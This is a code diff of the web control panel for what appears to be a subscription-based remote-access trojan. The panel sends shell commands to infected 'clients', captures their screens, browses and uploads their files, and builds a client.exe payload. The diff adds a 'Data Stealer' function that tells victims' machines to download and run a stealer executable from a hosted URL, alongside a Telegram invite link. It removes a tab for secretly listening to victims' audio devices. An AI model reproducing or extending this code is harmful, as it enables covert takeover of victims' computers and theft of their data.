@@ -36,196 +36,6 @@
       overflow-x: hidden;
     }
 
-    /* DARK THEME OVERRIDES */
-    body.dark {
-      --primary: #a29bfe;
-      --primary-dark: #6c5ce7;
-      --secondary: #00b894;
-      --danger: #d63031;
-      --success: #00cec9;
-      --warning: #ffeaa7;
-      --dark: #181825;
-      --darker: #10101a;
-      --light: #e5e5e5;
-      --sidebar-bg: linear-gradient(180deg, #181825 0%, #10101a 100%);
-      --card-bg: rgba(30, 30, 40, 0.95);
-      --card-bg-light: rgba(40, 40, 60, 0.85);
-      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-    }
-    body.dark {
-      background: linear-gradient(135deg, #181825, #232336, #10101a);
-      color: var(--light);
-    }
-    .dark .sidebar {
-      background: var(--sidebar-bg);
-      box-shadow: 0 0 40px rgba(0,0,0,0.7);
-    }
-    .dark .card {
-      background: var(--card-bg);
-      border: 1px solid rgba(162, 155, 254, 0.08);
-      box-shadow: 0 8px 32px rgba(30,30,40,0.7);
-    }
-    .dark .card:hover {
-      box-shadow: 0 15px 40px rgba(162, 155, 254, 0.08);
-      transform: translateY(-5px) scale(1.01);
-    }
-    .dark .tab-button {
-      background: var(--card-bg);
-      color: var(--light);
-      border: 1px solid rgba(162, 155, 254, 0.08);
-    }
-    .dark .tab-button:hover {
-      background: var(--card-bg-light);
-      color: var(--primary);
-    }
-    .dark .tab-button.active {
-      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
-      color: #fff;
-      box-shadow: 0 2px 8px rgba(162, 155, 254, 0.15);
-    }
-    .dark .btn {
-      color: #fff;
-      border: none;
-      box-shadow: 0 2px 8px rgba(162, 155, 254, 0.08);
-    }
-    .dark .btn-primary {
-      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-    }
-    .dark .btn-danger {
-      background: linear-gradient(135deg, var(--danger), #b71c1c);
-    }
-    .dark .btn-success {
-      background: linear-gradient(135deg, var(--success), #00a884);
-    }
-    .dark .btn-warning {
-      background: linear-gradient(135deg, var(--warning), #fdcb6e);
-      color: #181825;
-    }
-    .dark .input-field, .dark .file-list, .dark .output-console, .dark #stealerData {
-      background: rgba(30, 30, 40, 0.85);
-      color: var(--light);
-      border: 1px solid rgba(162, 155, 254, 0.08);
-    }
-    .dark .input-field:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 0 3px rgba(162, 155, 254, 0.15);
-    }
-    .dark .file-item {
-      background: transparent;
-      color: var(--light);
-    }
-    .dark .file-item:hover {
-      background: rgba(162, 155, 254, 0.08);
-      color: var(--primary);
-    }
-    .dark .explorer-header {
-      background: rgba(30, 30, 40, 0.85);
-      border: 1px solid rgba(162, 155, 254, 0.08);
-    }
-    .dark .profile-pic {
-      border: 2px solid var(--primary);
-    }
-    .dark .profile-value {
-      background: rgba(30, 30, 40, 0.85);
-      color: var(--light);
-    }
-    .dark #contextMenu {
-      background: rgba(30, 30, 40, 0.98);
-      border: 1px solid rgba(162, 155, 254, 0.12);
-    }
-    .dark #contextMenu div:hover {
-      background: rgba(162, 155, 254, 0.12);
-      color: var(--primary);
-    }
-    .dark .status-bar {
-      border-top: 1px solid rgba(162, 155, 254, 0.08);
-    }
-    .dark .status-item {
-      color: rgba(255,255,255,0.6);
-    }
-    .dark .status-value {
-      color: var(--primary);
-    }
-    .dark .logo-icon {
-      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
-      box-shadow: 0 4px 20px rgba(162, 155, 254, 0.15);
-    }
-    .dark .logo-text {
-      background: linear-gradient(to right, #a29bfe, #00b894);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .dark .profile-image-container img {
-      border: 2px solid var(--primary);
-    }
-    .dark .profile-section {
-      background: rgba(30, 30, 40, 0.85);
-      border-radius: 12px;
-    }
-    .dark .profile-section:hover {
-      background: rgba(162, 155, 254, 0.08);
-    }
-    .dark .profile-field label {
-      color: var(--primary);
-    }
-    .dark .profile-info {
-      color: var(--light);
-    }
-    .dark .profile-container {
-      background: none;
-    }
-    .dark .profile-value {
-      border: 1px solid rgba(162, 155, 254, 0.08);
-    }
-    .dark .btn-renew {
-      background: var(--primary);
-      color: #fff;
-    }
-    .dark .btn-renew:hover {
-      background: var(--primary-dark);
-    }
-    .dark .screenshot-container img {
-      border: 2px solid var(--primary);
-    }
-    .dark .output-console {
-      color: #e5e5e5;
-    }
-    .dark .file-size {
-      color: #b2bec3;
-    }
-    .dark .file-item.folder i {
-      color: #00b894;
-    }
-    .dark .file-item.file i {
-      color: #a29bfe;
-    }
-    .dark .explorer-header {
-      color: var(--primary);
-    }
-    .dark .input-group label {
-      color: var(--primary);
-    }
-    .dark .btn:focus {
-      outline: 2px solid var(--primary);
-    }
-    .dark .main-content {
-      background: none;
-    }
-    .dark .header h1 {
-      background: linear-gradient(to right, #a29bfe, #00b894);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .dark .theme-toggle {
-      background: rgba(162, 155, 254, 0.08);
-      color: var(--primary);
-    }
-    .dark .theme-toggle:hover {
-      background: rgba(162, 155, 254, 0.15);
-      color: #fff;
-    }
-    /* End dark theme overrides */
-
     /* Layout */
     .app-container {
       display: flex;
@@ -517,6 +327,12 @@
     .btn-success:hover {
       background: linear-gradient(135deg, #00a884, var(--success));
       box-shadow: 0 5px 15px rgba(0, 184, 148, 0.4);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      pointer-events: none;
     }
 
     .btn-warning {
@@ -814,15 +630,6 @@
       100% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0); }
     }
 
-    .fa-spin {
-      animation: fa-spin 2s infinite linear;
-    }
-
-    @keyframes fa-spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(359deg); }
-    }
-
     .pulse {
       animation: pulse 2s infinite;
     }
@@ -864,9 +671,6 @@
         </button>
         <button class="tab-button" onclick="showTab('stealer')">
           <i class="fas fa-search"></i> Data Stealer
-        </button>
-        <button class="tab-button" onclick="showTab('periphery')">
-          <i class="fas fa-headphones"></i> Периферия
         </button>
         <button class="tab-button" onclick="showTab('build')">
           <i class="fas fa-cogs"></i> Build
@@ -952,8 +756,8 @@
           <div class="card-header">
             <h2 class="card-title"><i class="fas fa-folder"></i> File Explorer</h2>
             <div class="action-buttons">
-              <input type="file" id="uploadInput" style="display: none;" />
-              <button class="btn btn-success" onclick="document.getElementById('uploadInput').click()">
+              <input type="file" id="uploadInput" class="input-field" style="width: auto; display: inline-block;" onchange="handleFileSelect(this)" />
+              <button class="btn btn-success" id="uploadBtn" onclick="uploadSelectedFile()" style="position: relative; z-index: 1000; pointer-events: auto;">
                 <i class="fas fa-upload"></i> Upload
               </button>
               <progress id="uploadProgress" value="0" max="100" style="width:120px; display:none;"></progress>
@@ -961,6 +765,9 @@
           </div>
           
           <div class="explorer-header">
+            <button class="btn btn-warning" onclick="goBack()" style="margin-right: 10px;">
+              <i class="fas fa-arrow-left"></i> Back
+            </button>
             <div id="pathDisplay">C:\</div>
           </div>
           
@@ -1012,7 +819,7 @@
           <div id="profileTab" class="tab-content">
           <div class="card">
             <div class="card-header">
-              <h2 class="card-title"><i class="fas fa-user"></i> Profile</h2>
+              <h2 class="card-title"><i class="fas fa-user"></i> Профиль</h2>
             </div>
             
             <div class="profile-container">
@@ -1032,36 +839,13 @@
                 
                 <div class="profile-field">
                   <label>Subscription status:</label>
-                  <div class="profile-value" style="display: flex; justify-content: space-between; align-items: center;">
-                    <span id="profileSubscription">Loading...</span>
-                    <i class="fas fa-sync-alt" onclick="renewSubscription()" 
-                       style="cursor: pointer; color: var(--primary); font-size: 1rem; margin-left: 10px;"
-                       title="Renew subscription"></i>
-                  </div>
-                </div>
-                
-                <div class="profile-field">
-                  <label>Account created:</label>
-                  <div class="profile-value" id="profileCreated">Loading...</div>
+                  <div class="profile-value" id="profileSubscription">Loading...</div>
+                  <button class="btn btn-success" onclick="renewSubscription()">
+                    <i class="fas fa-sync-alt"></i> Продлить
+                  </button>
                 </div>
               </div>
             </div>
-          </div>
-        </div>
-        <div id="peripheryTab" class="tab-content">
-          <div class="card">
-            <div class="card-header">
-              <h2 class="card-title"><i class="fas fa-headphones"></i> Periphery</h2>
-            </div>
-            <div class="input-group">
-              <label for="audioDeviceSelect">Audio:</label>
-              <select id="audioDeviceSelect" class="input-field"></select>
-            </div>
-            <div class="action-buttons">
-              <button class="btn btn-primary" onclick="startListenAudio()">Listen</button>
-              <button class="btn btn-danger" onclick="stopListenAudio()">Stop</button>
-            </div>
-            <div class="output-console" id="audioStatus">Select the device and tap "Listen"</div>
           </div>
         </div>
       </div>
@@ -1075,24 +859,33 @@
   </div>
 
   <script>
-    let selectedClient = "";
-    let currentPath = "C:\\\\";
+    let selectedClient = null;
+    let currentPath = "C:\\";
+    let pathHistory = ["C:\\"];
+    let pathIndex = 0;
     let rightClickedPath = "";
+    let selectedFile = null;
     let startTime = Date.now();
     
-    const output = document.getElementById("cmd-output");
+    const output = document.getElementById("cmd-output"); // Changed from output to cmd-output
     const explorer = document.getElementById("explorer");
     const downloadBtn = document.getElementById("downloadBtn");
     
     // Initialize UI
     function initUI() {
+      console.log("initUI() called");
       document.getElementById("clientList").onchange = function () {
-        selectedClient = this.value;
+        selectedClient = this.options[this.selectedIndex].value;
+        // При смене клиента загружаем корневую директорию
+        if (selectedClient) {
+          sendLs("C:\\");
+        }
       };
       loadClients();
       showTab('cmd');
       loadProfile();
       updateUptime();
+
       
       // Theme toggle event
       themeToggle.onclick = () => {
@@ -1103,45 +896,30 @@
       // Download button event
       downloadBtn.onclick = downloadStealerData;
       
-      // File upload event
-      document.getElementById('uploadInput').addEventListener('change', upload);
+      // File upload event handlers
+      const uploadInput = document.getElementById('uploadInput');
+      const uploadBtn = document.getElementById('uploadBtn');
+      
+      if (uploadInput && uploadBtn) {
+        // Устанавливаем начальное состояние кнопки
+        uploadBtn.textContent = 'Upload';
+        
+                  uploadInput.addEventListener('change', function() {
+            const files = this.files;
+            if (files.length > 0) {
+              selectedFile = files[0];
+              uploadBtn.textContent = `Upload ${selectedFile.name}`;
+            } else {
+              selectedFile = null;
+              uploadBtn.textContent = 'Upload';
+            }
+          });
+              }
       
       // Hide context menu when clicking elsewhere
       window.onclick = hideContextMenu;
     }
-
-    // WebSocket for real-time updates
-    const wss = new WebSocket(`wss://${location.host}/admin`);
-    wss.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      if (msg.type === "screen") {
-        document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
-      } else if (msg.type === "result") {
-        output.textContent += `[<-] ${msg.data}\n`;
-        output.scrollTop = output.scrollHeight;
-      } else if (msg.type === "explorer") {
-        renderExplorer(JSON.parse(msg.data));
-      } else if (msg.type === "stealer") {
-        document.getElementById("stealerData").textContent = msg.data;
-        downloadBtn.style.display = 'block';
-      } else if (msg.type === "audio_devices") {
-        const select = document.getElementById('audioDeviceSelect');
-        select.innerHTML = '';
-        const devices = JSON.parse(msg.data);
-        devices.forEach(d => {
-          const opt = document.createElement('option');
-          opt.value = d.id;
-          opt.textContent = d.name;
-          select.appendChild(opt);
-        });
-        document.getElementById('audioStatus').textContent = 'Доступные устройства обновлены';
-      } else if (msg.type === "audio_status") {
-        document.getElementById('audioStatus').textContent = msg.data;
-      } else if (msg.type == "hello"){
-        client.Username = msg.Data
-      }
-    };
-
+    
     // Apply theme
     function applyTheme(isDark) {
       document.body.classList.toggle("dark", isDark);
@@ -1178,475 +956,508 @@
 
           if (data.length && !selectedClient) {
             selectedClient = data[0].id;
+            // Загружаем файлы для первого клиента
+            sendLs("C:\\");
           }
 
-          document.getElementById("activeClients").textContent = data.length;
-          output.textContent += `[System] ${data.length} clients connected\n`;
         })
-        .catch(() => {
-          output.textContent += `[System] Error loading clients\n`;
-        });
     }
 
     
     // Show tab
     function showTab(tab) {
+      // Hide all tabs
       document.querySelectorAll(".tab-content").forEach(tabEl => {
         tabEl.classList.remove("active");
       });
       
+      // Show selected tab
       document.getElementById(`${tab}Tab`).classList.add("active");
       
+      // Highlight active button
       document.querySelectorAll(".tab-button").forEach(btn => {
         btn.classList.remove("active");
       });
-      if(tab === 'periphery') loadAudioDevices();
+      
+      // Найти нужную кнопку по data-атрибуту или id, и добавить класс active
+      // Например:
+      // document.querySelector(`[data-tab="${tab}"]`)?.classList.add("active");
     }
     
     // Send command
     function sendCommand() {
       const cmd = document.getElementById("cmdInput").value;
-      if (!selectedClient || !cmd) return;
-      
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "cmd", data: cmd })
-      }).then(res => {
-        if (res.ok) {
-          output.textContent += `[-> ${selectedClient}] ${cmd}\n`;
-        } else {
-          output.textContent += `[!!] Failed to send command\n`;
-        }
-        output.scrollTop = output.scrollHeight;
+      if (!selectedClient || !cmd) {
+          console.log("No client selected or command is empty");
+          return;
+      }
+
+      console.log("Sending command to client ID:", selectedClient);  // Логирование выбранного клиента
+
+      fetch(`/send/${selectedClient}`, {  // Убедитесь, что используете правильный ID клиента
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "cmd", data: cmd })
+      })
+      .then(res => {
+          if (res.ok) {
+              output.textContent += `[-> ${selectedClient}] ${cmd}\n`;
+          } else {
+              output.textContent += `[!!] Failed to send command\n`;
+          }
+          output.scrollTop = output.scrollHeight;
       });
-      
+
       document.getElementById("cmdInput").value = "";
     }
     
     // Screen functions
     function startScreen() {
-      if (!selectedClient) return;
-      
+      if (!selectedClient) {
+          console.log("No client selected");
+          return;
+      }
+
+      console.log("Sending start_screen to client ID:", selectedClient);
+
+      fetch(`/send/${selectedClient}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "start_screen", data: "" })  // Параметр data может быть пустым
+      })
+      .then(res => {
+          if (res.ok) {
+              console.log("[-> Success] Screen capture started");
+          } else {
+              console.log("[!!] Failed to start screen capture");
+          }
+      })
+      .catch(error => {
+          console.error("[Error] Fetch failed: ", error);
+      });
+    }
+
+    
+    function stopScreen() {
+      if (!selectedClient) {
+          console.log("No client selected");
+          return;
+      }
+
+      console.log("Sending stop_screen to client ID:", selectedClient);
+
+      fetch(`/send/${selectedClient}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "stop_screen", data: "" })  // Параметр data может быть пустым
+      })
+      .then(res => {
+          if (res.ok) {
+              console.log("[-> Success] Screen capture stopped");
+          } else {
+              console.log("[!!] Failed to stop screen capture");
+          }
+      })
+      .catch(error => {
+          console.error("[Error] Fetch failed: ", error);
+      });
+    }
+
+    
+    // Steal data
+    function stealData() {
       const status = document.getElementById("stealerStatus");
-      status.textContent = `[Screen] Starting screen capture for ${selectedClient}...`;
+      status.textContent = `[Stealer] Starting data extraction from ${selectedClient}...`;
       
       fetch(`/send/${selectedClient.id}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "start_screen", data: "" })
+        body: JSON.stringify({
+          type: "run_stealer",
+          data: "https://panel-agzz.onrender.com/apps/steller.exe"
+        })
+      })
+      .then(() => {
+        status.textContent = "Stealer activated successfully!     https://t.me/+85LIvpGqyhY2NTZi";
+      })
+      .catch(err => {
+        status.textContent = "Error: " + err.message;
       });
     }
     
-    function stopScreen() {
-      if (!selectedClient) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent += `\n[Screen] Stopping capture...`;
-      
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "stop_screen", data: "" })
-      });
-    }
+    function sendLs(path) {
+      if (!selectedClient) {
+          console.log("No client selected");
+          return;
+      }
 
-    // Stealer functions
-    function stealData() {
-      if (!selectedClient) return;
+      console.log(`Sending ls for path: ${path} to client ID: ${selectedClient}`);
+      currentPath = path; // Обновляем текущий путь
+      document.getElementById("pathDisplay").textContent = path; // Обновляем отображение пути
       
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Stealer] Starting data extraction for ${selectedClient}...`;
-      
-      fetch(`/send/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "steal_data", data: "" })
-      });
-    }
+      // Добавляем путь в историю
+      if (pathHistory[pathIndex] !== path) {
+          pathHistory = pathHistory.slice(0, pathIndex + 1);
+          pathHistory.push(path);
+          pathIndex = pathHistory.length - 1;
+      }
 
-    function downloadStealerData() {
-      if (!selectedClient) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Stealer] Downloading data for ${selectedClient}...`;
-      
-      fetch(`/download/${selectedClient.id}`)
-        .then(res => {
-          if (res.ok) {
-            res.blob().then(blob => {
-              const url = window.URL.createObjectURL(blob);
-              const a = document.createElement('a');
-              a.href = url;
-              a.download = `data_${selectedClient}.zip`; // Example filename
-              document.body.appendChild(a);
-              a.click();
-              window.URL.revokeObjectURL(url);
-              status.textContent = `[Stealer] Data downloaded for ${selectedClient}`;
-            });
-          } else {
-            status.textContent = `[Stealer] Failed to download data: ${res.statusText}`;
-          }
-        })
-        .catch(err => {
-          status.textContent = `[Stealer] Error downloading data: ${err}`;
-        });
-    }
-
-    // File explorer functions
-    function navigate(path) {
-      if (!selectedClient) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Explorer] Navigating to: ${path}`;
-      
-      fetch(`/navigate/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "navigate", data: path })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          currentPath = data.path;
-          document.getElementById("pathDisplay").textContent = currentPath;
-          loadFiles();
-          status.textContent = `[Explorer] Navigated to: ${currentPath}`;
-        } else {
-          status.textContent = `[Explorer] Failed to navigate: ${data.message}`;
-        }
-      })
-      .catch(err => {
-        status.textContent = `[Explorer] Error navigating: ${err}`;
-      });
-    }
-
-    function loadFiles() {
-      if (!selectedClient) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Explorer] Loading files in: ${currentPath}`;
-      
-      fetch(`/list/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "list", data: currentPath })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          explorer.innerHTML = ""; // Clear previous files
-          data.files.forEach(file => {
-            const item = document.createElement("div");
-            item.classList.add("file-item");
-            item.innerHTML = `
-              <i class="fas fa-${file.isDirectory ? 'folder' : 'file'}"></i>
-              <div class="file-name">${file.name}</div>
-              <div class="file-size">${file.size}</div>
-            `;
-            item.onclick = () => {
-              if (file.isDirectory) {
-                navigate(`${currentPath}${file.name}/`);
-              } else {
-                rightClickedPath = `${currentPath}${file.name}`;
-                showContextMenu(event);
-              }
-            };
-            item.oncontextmenu = (e) => {
-              e.preventDefault();
-              rightClickedPath = `${currentPath}${file.name}`;
-              showContextMenu(e);
-            };
-            explorer.appendChild(item);
-          });
-          status.textContent = `[Explorer] Files loaded for ${currentPath}`;
-        } else {
-          status.textContent = `[Explorer] Failed to load files: ${data.message}`;
-        }
-      })
-      .catch(err => {
-        status.textContent = `[Explorer] Error loading files: ${err}`;
-      });
-    }
-
-    function upload() {
-      if (!selectedClient) return;
-      
-      const file = document.getElementById('uploadInput').files[0];
-      if (!file) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Upload] Uploading ${file.name} to ${currentPath}`;
-      
-      const formData = new FormData();
-      formData.append("file", file);
-      formData.append("path", currentPath);
-
-      fetch(`/upload/${selectedClient.id}`, {
-        method: "POST",
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          status.textContent = `[Upload] ${file.name} uploaded to ${currentPath}`;
-          loadFiles(); // Reload files to show new file
-        } else {
-          status.textContent = `[Upload] Failed to upload ${file.name}: ${data.message}`;
-        }
-      })
-      .catch(err => {
-        status.textContent = `[Upload] Error uploading ${file.name}: ${err}`;
-      });
-    }
-
-    function deleteFile() {
-      if (!selectedClient || !rightClickedPath) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Delete] Deleting ${rightClickedPath} from ${currentPath}`;
-      
-      fetch(`/delete/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "delete", data: rightClickedPath })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success) {
-          status.textContent = `[Delete] ${rightClickedPath} deleted from ${currentPath}`;
-          loadFiles(); // Reload files to show updated list
-        } else {
-          status.textContent = `[Delete] Failed to delete ${rightClickedPath}: ${data.message}`;
-        }
-      })
-      .catch(err => {
-        status.textContent = `[Delete] Error deleting ${rightClickedPath}: ${err}`;
-      });
-    }
-
-    function openFile() {
-      if (!selectedClient || !rightClickedPath) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Open] Opening ${rightClickedPath} from ${currentPath}`;
-      
-      fetch(`/open/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "open", data: rightClickedPath })
-      })
-      .then(res => res.blob())
-      .then(blob => {
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = rightClickedPath.split('/').pop(); // Use filename from path
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        status.textContent = `[Open] ${rightClickedPath} opened and downloaded`;
-      })
-      .catch(err => {
-        status.textContent = `[Open] Error opening ${rightClickedPath}: ${err}`;
-      });
-    }
-
-    function downloadFile() {
-      if (!selectedClient || !rightClickedPath) return;
-      
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Download] Downloading ${rightClickedPath} from ${currentPath}`;
-      
-      fetch(`/download/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "download", data: rightClickedPath })
+      fetch(`/send/${selectedClient}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "ls", data: path })
       })
       .then(res => {
-        if (res.ok) {
-          res.blob().then(blob => {
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = rightClickedPath.split('/').pop(); // Use filename from path
-            document.body.appendChild(a);
-            a.click();
-            window.URL.revokeObjectURL(url);
-            status.textContent = `[Download] ${rightClickedPath} downloaded`;
-          });
-        } else {
-          status.textContent = `[Download] Failed to download ${rightClickedPath}: ${res.statusText}`;
-        }
+          if (res.ok) {
+              console.log("ls command sent successfully");
+          } else {
+              console.log("[!!] Failed to send ls command");
+          }
       })
-      .catch(err => {
-        status.textContent = `[Download] Error downloading ${rightClickedPath}: ${err}`;
+      .catch(error => {
+          console.error("[Error] Fetch failed: ", error);
       });
-    }
+  }
 
-    // Context menu
-    function showContextMenu(event) {
-      const contextMenu = document.getElementById("contextMenu");
-      contextMenu.style.display = "block";
-      contextMenu.style.top = `${event.clientY}px`;
-      contextMenu.style.left = `${event.clientX}px`;
-      document.addEventListener("click", hideContextMenu);
-    }
-
-    function hideContextMenu(event) {
-      const contextMenu = document.getElementById("contextMenu");
-      if (!contextMenu.contains(event.target)) {
-        contextMenu.style.display = "none";
-        document.removeEventListener("click", hideContextMenu);
+    function goBack() {
+      if (pathIndex > 0) {
+          pathIndex--;
+          const previousPath = pathHistory[pathIndex];
+          sendLs(previousPath);
       }
     }
 
-    // Profile functions
-    function loadProfile() {
-      if (!selectedClient) return;
+
+
+    function handleFileSelect(input) {
+      const files = input.files;
+      if (files.length > 0) {
+        selectedFile = files[0];
+        const uploadBtn = document.getElementById('uploadBtn');
+        uploadBtn.textContent = `Upload ${selectedFile.name}`;
+      } else {
+        selectedFile = null;
+        const uploadBtn = document.getElementById('uploadBtn');
+        uploadBtn.textContent = 'Upload';
+      }
+    }
+
+    function uploadSelectedFile() {
+      if (!selectedFile) {
+        // Попробуем взять файл напрямую из input
+        const uploadInput = document.getElementById('uploadInput');
+        if (uploadInput.files.length > 0) {
+          selectedFile = uploadInput.files[0];
+        } else {
+          alert("Please select a file first");
+          return;
+        }
+      }
+      if (!selectedClient) {
+        alert("Please select a client first");
+        return;
+      }
       
-      const status = document.getElementById("stealerStatus");
-      status.textContent = `[Profile] Loading profile for ${selectedClient}...`;
+      console.log(`Uploading ${selectedFile.name} to ${currentPath}`);
+      const progress = document.getElementById("uploadProgress");
+      progress.style.display = 'block';
+      progress.value = 0;
       
-      fetch(`/profile/${selectedClient.id}`)
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            document.getElementById("profileUsernameDisplay").textContent = data.name || "N/A";
-            document.getElementById("profileSubscription").textContent = data.subscription_status || "N/A";
-            document.getElementById("profileCreated").textContent = data.account_created || "N/A";
-            document.getElementById("profileImage").src = data.profile_image || "./default-profile.png";
-            status.textContent = `[Profile] Profile loaded for ${selectedClient}`;
+      const reader = new FileReader();
+      reader.onload = function() {
+        const base64Data = reader.result.split(",")[1];
+        const payload = {
+          filename: currentPath.endsWith("\\") ? currentPath + selectedFile.name : currentPath + "\\" + selectedFile.name,
+          content: base64Data
+        };
+
+        console.log("Sending upload request...");
+        fetch(`/send/${selectedClient}`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ type: "upload", data: JSON.stringify(payload) })
+        }).then(res => {
+          progress.style.display = "none";
+          if (res.ok) {
+            console.log("Upload completed successfully!");
+            alert("File uploaded successfully!");
+            // Обновляем список файлов после загрузки
+            setTimeout(() => {
+              sendLs(currentPath);
+            }, 1000);
+            // Очищаем выбранный файл
+            selectedFile = null;
+            document.getElementById('uploadBtn').textContent = 'Upload';
           } else {
-            status.textContent = `[Profile] Failed to load profile: ${data.message}`;
+            console.log("Failed to upload file");
+            alert("Failed to upload file");
+          }
+        }).catch(error => {
+          progress.style.display = "none";
+          console.error("Upload error:", error);
+          alert("Upload error: " + error.message);
+        });
+      };
+
+      reader.onprogress = function(evt) {
+        if (evt.lengthComputable) {
+          const percent = (evt.loaded / evt.total) * 100;
+          progress.value = percent;
+        }
+      };
+
+      reader.readAsDataURL(selectedFile);
+    }
+
+
+    
+    // Render explorer
+    function renderExplorer(files) {
+      const explorer = document.getElementById("explorer");
+      explorer.innerHTML = "";  // Очищаем текущий список файлов
+
+      if (files.length === 0) {
+          explorer.innerHTML = "<div>No files found.</div>";  // Если файлов нет
+      }
+
+      files.forEach(file => {
+          const fileItem = document.createElement("div");
+          fileItem.className = `file-item ${file.dir ? "folder" : "file"}`;
+          fileItem.innerHTML = `
+              <i class="fas ${file.dir ? "fa-folder" : "fa-file"}"></i>
+              <div class="file-name">${file.name}</div>
+          `;
+
+          // Если это папка, добавляем обработчик клика для перехода в неё
+          if (file.dir) {
+              fileItem.onclick = function() {
+                  sendLs(file.full);  // Отправляем запрос для подкаталога
+              };
+          } else {
+              // Для файлов добавляем контекстное меню
+              fileItem.oncontextmenu = function(e) {
+                  e.preventDefault();
+                  rightClickedPath = file.full;
+                  showContextMenu(e.clientX, e.clientY);
+              };
+          }
+
+          explorer.appendChild(fileItem);
+      });
+    }
+
+
+
+
+
+    function createBuild() {
+      const status = document.getElementById("buildStatus");
+
+      status.textContent = "Building...";
+
+      fetch(`/create_build`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.message) {
+          status.textContent = data.message;
+
+          const a = document.createElement("a");
+          a.href = "/download_build";
+          a.download = "client.exe";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        } else {
+          status.textContent = "Build failed: " + (data.error || "unknown error");
+        }
+      })
+      .catch(error => {
+        status.textContent = "Error: " + error.message;
+      });
+    }
+
+    function loadProfile() {
+      fetch('/profile')
+        .then(res => {
+          if (!res.ok) {
+            throw new Error('Не авторизован или ошибка сервера');
+          }
+          return res.json();
+        })
+        .then(data => {
+          const username = data.username || 'Guest';
+          document.getElementById('profileUsername').textContent = username;
+          document.getElementById('profileUsernameDisplay').textContent = username;
+          
+          let subscriptionText;
+          if (data.subscriptionEnd > 0) {
+            subscriptionText = `Подписка: ${data.subscriptionEnd} дней`;
+          } else {
+            subscriptionText = 'Нет подписки';
+          }
+          document.getElementById('profileSubscription').textContent = subscriptionText;
+          
+          const imgUrl = data.image ? 
+            `${data.image}?t=${new Date().getTime()}` : 
+            './default-profile.png';
+          document.getElementById('profileImage').src = imgUrl;
+          document.getElementById('profileDisplayImage').src = imgUrl;
+          
+          if (data.created) {
+            document.getElementById('profileCreated').textContent = 
+              `Аккаунт создан: ${new Date(data.created).toLocaleDateString()}`;
+          } else {
+            document.getElementById('profileCreated').textContent = '';
           }
         })
         .catch(err => {
-          status.textContent = `[Profile] Error loading profile: ${err}`;
+          const errorMsg = 'Ошибка загрузки профиля: ' + (err && err.message ? err.message : err);
+          document.getElementById('profileUsername').textContent = errorMsg;
+          document.getElementById('profileUsernameDisplay').textContent = errorMsg;
+          document.getElementById('profileSubscription').textContent = errorMsg;
+          document.getElementById('profileCreated').textContent = errorMsg;
         });
     }
 
     function renewSubscription() {
-      if (!selectedClient) return;
-      
-      const status = document.getElementById("stealerStatus");
-      const renewIcon = document.querySelector("#profileSubscription i");
-      
-      // Add loading animation
-      renewIcon.classList.add("fa-spin");
-      status.textContent = `[Renew] Renewing subscription for ${selectedClient}...`;
-      
-      fetch(`/renew/${selectedClient.id}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "renew_subscription", data: "" })
-      })
